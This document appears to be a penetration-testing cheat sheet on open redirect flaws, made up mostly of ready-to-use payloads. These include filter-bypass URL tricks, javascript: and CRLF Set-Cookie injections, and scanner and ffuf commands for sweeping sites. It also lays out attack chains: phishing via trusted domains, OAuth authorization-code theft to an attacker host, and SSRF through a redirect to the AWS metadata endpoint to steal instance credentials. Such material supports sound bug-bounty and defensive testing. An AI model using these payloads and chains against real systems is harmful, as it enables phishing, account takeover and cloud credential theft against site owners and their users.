Open Redirect

An open redirect occurs when an application accepts a user-controlled URL and redirects the browser to it without validation. While often dismissed as low-severity, open redirects are valuable in attack chains: they lend phishing links an air of legitimacy (the domain is real), can bypass SSRF filters that allowlist trusted origins, enable OAuth redirect_uri abuse, and serve as delivery vehicles for further exploitation. In bug bounty programs they are commonly accepted when chained with another vulnerability.

Basic Payloads

# Direct redirect to external host:
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=/\evil.com

# Protocol confusion:
https://target.com/redirect?url=javascript:alert(1)
https://target.com/redirect?url=data:text/html,

# Subdomain bypass — attacker registers target.com.evil.com:
https://target.com/redirect?url=https://target.com.evil.com
https://target.com/redirect?url=https://evil.com?target.com

# URL confusion — browser sends to evil.com:
http://www.theirsite.com@yoursite.com/
http://target.com\evil.com
http://target.com/http://evil.com/

# Double slash / backslash tricks:
//evil.com
///evil.com
/\/evil.com
\/evil.com
\\evil.com

Filter Bypass Techniques

# If the filter checks that URL starts with target.com:
https://target.com@evil.com        # user@host format — browser goes to evil.com
https://target.com.evil.com        # subdomain confusion
/\/evil.com                        # parsed as //evil.com by some browsers
//evil.com/%2f..                   # path traversal after host
//www.google.com/%2f%2e%2e        # URL-encoded /../

# Unicode / internationalized:
/?redir=google。com               # Japanese period (。) — looks like a dot
//google%E3%80%82com              # URL-encoded Japanese period
//google%00.com                   # null byte truncation

# Tab / whitespace:
/%09/evil.com                      # tab character
/ /evil.com                        # space

# Path traversal:
/www.evil.com/../redirect?url=https://evil.com

# Parameter pollution:
?redirect=https://target.com&redirect=https://evil.com  # last value wins

# Always URL-encode payloads when injecting into existing parameters:
# https://evil.com → https%3A%2F%2Fevil.com

Attack Scenarios

Phishing Chain

# Attacker sends:
https://legitimate-bank.com/login?next=https://evil-phishing.com/fake-login

# Victim sees legitimate-bank.com in the URL bar → clicks → gets phished
# The redirect happens server-side before the victim realizes
# Very effective because the initial URL passes link scanners

OAuth Abuse

# OAuth flow uses redirect_uri to return the auth code:
https://provider.com/oauth/authorize?client_id=APP&redirect_uri=https://app.com/callback

# If the app has an open redirect:
https://provider.com/oauth/authorize?client_id=APP&redirect_uri=https://app.com/redirect?url=https://evil.com

# OAuth sends the auth code to: https://app.com/redirect?url=https://evil.com
# App redirects to evil.com, which captures the code from the Referer header
# → account takeover without any user interaction beyond clicking "Authorize"

SSRF Filter Bypass

# Application allowlists certain trusted hosts for SSRF prevention:
# Only allows fetches to: s3.amazonaws.com, api.partner.com

# If api.partner.com has an open redirect:
https://vulnerable-app.com/fetch?url=https://api.partner.com/redirect?url=http://169.254.169.254/latest/meta-data/

# The SSRF allowlist check passes (api.partner.com is trusted)
# api.partner.com redirects to AWS metadata endpoint
# Attacker gets EC2 instance credentials

Tools

# Oralyzer — automated open redirect scanner:
# https://github.com/0xNanda/Oralyzer
python3 oralyzer.py -u https://website.com/redir?url=

# OpenRedireX — fuzz open redirects with payloads:
# https://github.com/devanshbatham/OpenRedireX
python3 openredirex.py -u "https://website.com/?url=FUZZ" -p payloads.txt --keyword FUZZ

# ffuf — sweep all redirect params from a wordlist:
ffuf -u "https://target.com/FUZZ=https://evil.com" \
  -w /opt/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 301,302,303,307,308

# From URL list (Wayback/gau output):
gau target.com | grep -E "[?&](url|next|redirect|redir|return|dest)=" \
  | sed 's/=.*/=https:\/\/evil.com/' > redirect_test.txt
ffuf -u FUZZ -w redirect_test.txt -mc 301,302,303

URL Parser Bypass Techniques

Advanced filter bypass techniques from PayloadsAllTheThings, covering all major WAF and filter patterns.

Keyword Bypass

# Bypass "http" keyword blacklist using double slash:
//google.com
////google.com

# Bypass "//" blacklist:
https:google.com

# Bypass "//" with backslash:
\/\/google.com/
/\/google.com/

# Bypass "javascript" using CRLF:
java%0d%0ascript%0d%0a:alert(0)

Domain Confusion

# @ character (browser authenticates to evil.com with target.com credentials):
http://www.theirsite.com@yoursite.com/

# Domain as path:
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com

# Whitelisted domain as subdomain of attacker:
www.whitelisted.com.evil.com  # redirect to evil.com

Dot Bypass (Unicode)

# Unicode dot bypass (bypass dot-blacklist):
/?redir=google。com              # Japanese period (。)
//google%E3%80%82com             # URL-encoded Japanese period

# Null byte truncation:
//google%00.com

HTTP Parameter Pollution

# Last value wins (some frameworks):
?next=whitelisted.com&next=google.com

# First value wins:
?next=google.com&next=whitelisted.com

Question Mark and Misc

# Question mark — browser translates to /?:
?url=https://evil.com?target.com

# Fragment:
?url=https://evil.com#target.com

# Newline injection (chains with CRLF header injection):
https://evil.com%0d%0aSet-Cookie:session=hijacked
